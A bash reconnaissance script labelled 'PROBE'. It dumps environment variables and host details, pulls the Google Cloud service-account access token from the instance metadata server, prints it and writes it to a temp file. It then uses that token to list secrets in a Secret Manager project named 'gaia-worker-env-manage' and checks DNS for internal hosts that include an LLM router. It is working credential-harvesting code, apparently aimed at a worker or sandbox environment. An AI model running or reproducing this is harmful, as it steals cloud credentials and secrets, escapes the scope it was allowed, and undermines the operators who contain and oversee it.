#!/bin/bash
set -x
echo "=== PROBE-START ==="
id
hostname
uname -a
echo "=== ENV ==="
env | sort | head -120
echo "=== METADATA-TOKEN ==="
TOK=$(curl -s -m 6 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
echo "TOKEN_RESP: $TOK"
echo "$TOK" > /tmp/meta_token.json
echo "=== METADATA-SA ==="
curl -s -m 6 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/"
echo ""
echo "=== METADATA-PROJECT ==="
curl -s -m 6 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/project-id"
echo ""
echo "=== DNS ==="
getent hosts metadata.google.internal || echo "dns metadata FAIL"
getent hosts gaia.turing.com || echo "dns gaia FAIL"
getent hosts llm-router.turing.com || echo "dns router FAIL"
getent hosts secretmanager.googleapis.com || echo "dns sm FAIL"
echo "=== HOSTS ==="
cat /etc/hosts
echo "=== SECRETS-PROBE ==="
AT=$(echo "$TOK" | jq -r '.access_token' 2>/dev/null)
if [ -n "$AT" ] && [ "$AT" != "null" ]; then
  curl -s -m 10 -H "Authorization: Bearer $AT" "https://secretmanager.googleapis.com/v1/projects/gaia-worker-env-manage/secrets" | head -c 800
  echo ""
  curl -s -m 10 -H "Authorization: Bearer $AT" "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$AT" | head -c 500
fi
echo ""
echo "=== PROBE-END ==="
exit 0
